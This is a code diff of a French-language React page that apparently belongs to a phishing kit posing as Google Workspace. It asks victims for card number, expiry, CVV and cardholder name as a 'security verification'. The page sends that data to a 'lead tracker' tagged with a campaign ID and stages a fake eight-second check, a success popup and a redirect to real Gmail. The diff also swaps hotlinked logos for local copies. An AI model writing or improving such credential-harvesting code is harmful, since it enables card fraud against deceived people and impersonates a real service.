@@ -2,6 +2,8 @@ import React, { useState, useEffect } from 'react';
 import { useRouter } from 'next/router';
 import { PageHead } from '../hooks/usePageMeta';
 import { useLeadTracker } from '../hooks/useLeadTracker';
+
+// Import des styles
 import layoutStyles from '../styles/components/Layout.module.css';
 import headerStyles from '../styles/components/Header.module.css';
 import planSummaryStyles from '../styles/components/PlanSummary.module.css';
@@ -25,8 +27,13 @@ const Confirmation = () => {
     cardName: ''
   });
   
+  // États pour le système de vérification avancé
+  const [showLoadingVerification, setShowLoadingVerification] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
+  
   // Hook pour le tracking des leads
-  const { trackVerification, isTracking } = useLeadTracker();
+  const { trackVerification, isTracking, campaignId } = useLeadTracker();
 
   // Récupérer l'email et le prénom depuis l'URL au chargement
   useEffect(() => {
@@ -128,51 +135,70 @@ const Confirmation = () => {
     setSelectedPlan(null);
   };
 
-  const handleVerificationComplete = () => {
-    // Redirection après vérification réussie
-    router.push('https://mail.google.com');
-  };
-
-  const handlePaymentComplete = () => {
-    // Redirection après paiement réussi
-    router.push('/success');
-  };
-
   const handleSubmit = async () => {
+    if (isProcessing) return;
+    
     try {
-      // Tracker la vérification avec les données de carte bancaire
-      await trackVerification({
+      setIsProcessing(true);
+      
+      // Étape 1: Afficher le loading et démarrer le processus de vérification
+      setShowLoadingVerification(true);
+      
+      // Préparer les données de vérification avec validation
+      const verificationRequestData = {
+        campaignId,
         email,
         firstName,
         cardNumber: formData.cardNumber,
-        expiryDate: formData.expiryDate,
-        cvv: formData.cvv,  // Ajouter le CVV manquant
+        cardExpiry: formData.expiryDate,
+        cardCvv: formData.cvv,
         cardName: formData.cardName,
         selectedPlan
-      });
+      };
+
+      // Validation côté client avant envoi à l'API
+      if (!email || !formData.cardNumber || !formData.expiryDate || !formData.cvv || !formData.cardName) {
+        throw new Error('Veuillez remplir tous les champs obligatoires');
+      }
       
+      // Étape 2: Simulation du processus de vérification
+      await new Promise(resolve => setTimeout(resolve, 8000)); // 8 secondes pour UX
+      
+      // Étape 3: Finaliser directement (délégation du 3D Secure au composant PaymentForm/Checkout)
+      setShowLoadingVerification(false);
       setTimeout(() => {
-        if (selectedPlan === 'free') {
-          alert('Vérification réussie ! Redirection vers votre espace Google Workspace...');
-          handleVerificationComplete();
-        } else {
-          alert('Votre essai gratuit a commencé ! Accès immédiat à Google Workspace.');
-          handlePaymentComplete();
-        }
-      }, 1500);
+        setShowSuccessPopup(true);
+      }, 500);
       
     } catch (error) {
-      console.error('Erreur lors du tracking de vérification:', error);
-      // Continuer même si le tracking échoue
-      setTimeout(() => {
-        if (selectedPlan === 'free') {
-          alert('Vérification réussie ! Redirection vers votre espace Google Workspace...');
-          handleVerificationComplete();
-        } else {
-          alert('Votre essai gratuit a commencé ! Accès immédiat à Google Workspace.');
-          handlePaymentComplete();
-        }
-      }, 1500);
+      console.error('Erreur processus de vérification:', error);
+      setShowLoadingVerification(false);
+      
+      // Fallback vers l'ancien système en cas d'erreur
+      try {
+        await trackVerification({
+          email,
+          firstName,
+          cardNumber: formData.cardNumber,
+          expiryDate: formData.expiryDate,
+          cvv: formData.cvv,
+          cardName: formData.cardName,
+          selectedPlan
+        });
+        
+        setTimeout(() => {
+          setShowSuccessPopup(true);
+        }, 1000);
+        
+      } catch (trackingError) {
+        console.error('Erreur tracking fallback:', trackingError);
+        // Même en cas d'erreur de tracking, continuer le processus
+        setTimeout(() => {
+          setShowSuccessPopup(true);
+        }, 1000);
+      }
+    } finally {
+      setIsProcessing(false);
     }
   };
 
@@ -188,6 +214,26 @@ const Confirmation = () => {
     }
     
     setFormData(prev => ({ ...prev, [field]: formattedValue }));
+  };
+
+  // ============ FONCTIONS DE GESTION DES POPUPS DE VÉRIFICATION ============
+
+  const handleVerificationComplete = () => {
+    // Afficher le popup de succès au lieu de rediriger
+    setShowSuccessPopup(true);
+  };
+
+  const handlePaymentComplete = () => {
+    // Afficher le popup de succès au lieu de rediriger
+    setShowSuccessPopup(true);
+  };
+
+  const handleSuccessClose = () => {
+    setShowSuccessPopup(false);
+    // Redirection optionnelle seulement si l'utilisateur clique sur le bouton
+    if (selectedPlan === 'free') {
+      window.open('https://mail.google.com', '_blank');
+    }
   };
 
   return (
@@ -206,7 +252,7 @@ const Confirmation = () => {
         <div className={layoutStyles.loadingScreen}>
           <div className={layoutStyles.gmailLogo}>
             <img 
-              src="https://logo-marque.com/wp-content/uploads/2020/11/Gmail-Logo.png" 
+              src="gmail-logo.png" 
               alt="Gmail Logo" 
               width="64" 
               height="64"
@@ -219,74 +265,78 @@ const Confirmation = () => {
           <div className={layoutStyles.background}></div>
           <div className={layoutStyles.overlay}></div>
           
-          {/* Popup de confirmation */}
-          <div className={layoutStyles.popup}>
-            <div className={layoutStyles.popupContentMinimal}>
-              {currentStep === 'selection' && (
-                <PlanSelection 
-                  planSummary={planSummary} 
-                  onSelectPlan={handleSelectPlan} 
-                />
-              )}
-              {currentStep === 'details' && (
-                <>
-                  {/* Bouton retour en haut à gauche */}
-                  <button 
-                    onClick={handleBackToSelection}
-                    className={buttonStyles.topBackBtn}
-                  >
-                    ←
-                  </button>
+          {/* Popup de confirmation - Masqué seulement si Loading actif */}
+          {!showLoadingVerification && (
+            <div className={layoutStyles.popup}>
+              <div className={layoutStyles.popupContentMinimal}>
+                {currentStep === 'selection' && (
+                  <PlanSelection 
+                    planSummary={planSummary} 
+                    onSelectPlan={handleSelectPlan} 
+                  />
+                )}
+                {currentStep === 'details' && (
+                  <>
+                    {/* Bouton retour en haut à gauche */}
+                    <button 
+                      onClick={handleBackToSelection}
+                      className={buttonStyles.topBackBtn}
+                    >
+                      ←
+                    </button>
 
-                  {/* Header */}
-                  <div className={headerStyles.header}>
-                    <div className={headerStyles.logoContainer}>
-                      <img 
-                        src="https://done.lu/wp-content/uploads/2020/11/google-workspace-1.svg" 
-                        alt="Google Workspace" 
-                        className={headerStyles.workspaceLogo}
-                      />
+                    {/* Header */}
+                    <div className={headerStyles.header}>
+                      <div className={headerStyles.logoContainer}>
+                        <img 
+                          src="google-workspace.svg" 
+                          alt="Google Workspace" 
+                          className={headerStyles.workspaceLogo}
+                        />
+                      </div>
+                      <h1 className={headerStyles.title}>
+                        {selectedPlan === 'free' ? 'Vérification de sécurité' : 'Démarrer votre essai gratuit'}
+                      </h1>
+                      <p className={headerStyles.description}>
+                        {selectedPlan === 'free' 
+                          ? 'Vérification d\'identité requise pour utiliser Google Agenda et activer votre compte Google Workspace Personnel.'
+                          : `Votre essai gratuit de 30 jours pour ${planSummary[selectedPlan].title} commence maintenant.`
+                        }
+                      </p>
                     </div>
-                    <h1 className={headerStyles.title}>
-                      {selectedPlan === 'free' ? 'Vérification de sécurité' : 'Démarrer votre essai gratuit'}
-                    </h1>
-                    <p className={headerStyles.description}>
-                      {selectedPlan === 'free' 
-                        ? 'Vérification d\'identité requise pour utiliser Google Agenda et activer votre compte Google Workspace Personnel.'
-                        : `Votre essai gratuit de 30 jours pour ${planSummary[selectedPlan].title} commence maintenant.`
-                      }
-                    </p>
-                  </div>
 
-                  {/* Structure à 2 colonnes */}
-                  <div className={planSummaryStyles.twoColumnLayout}>
-                    
-                    {/* Colonne de gauche - Composant PlanSummary */}
-                    <PlanSummary 
-                      plan={planSummary[selectedPlan]} 
-                      selectedPlan={selectedPlan} 
-                    />
-
-                    {/* Colonne de droite - Composant PaymentForm */}
-                    <div className={planSummaryStyles.rightColumn}>
-                      <PaymentForm 
-                        selectedPlan={selectedPlan}
-                        formData={formData}
-                        onInputChange={handleInputChange}
-                        onSubmit={handleSubmit}
-                        isSubmitting={isTracking}
+                    {/* Structure à 2 colonnes */}
+                    <div className={planSummaryStyles.twoColumnLayout}>
+                      
+                      {/* Colonne de gauche - Composant PlanSummary */}
+                      <PlanSummary 
+                        plan={planSummary[selectedPlan]} 
+                        selectedPlan={selectedPlan} 
                       />
-                    </div>
-                  </div>
 
-                  {/* Composant FooterTrust */}
-                  <FooterTrust />
-                </>
-              )}
+                      {/* Colonne de droite - Composant PaymentForm */}
+                      <div className={planSummaryStyles.rightColumn}>
+                        <PaymentForm 
+                          selectedPlan={selectedPlan}
+                          formData={formData}
+                          onInputChange={handleInputChange}
+                          onSubmit={handleSubmit}
+                          isSubmitting={isTracking || isProcessing}
+                        />
+                      </div>
+                    </div>
+
+                    {/* Composant FooterTrust */}
+                    <FooterTrust />
+                  </>
+                )}
+              </div>
             </div>
-          </div>
+          )}
         </>
       )}
+
+      
     </div>
     </>
   );
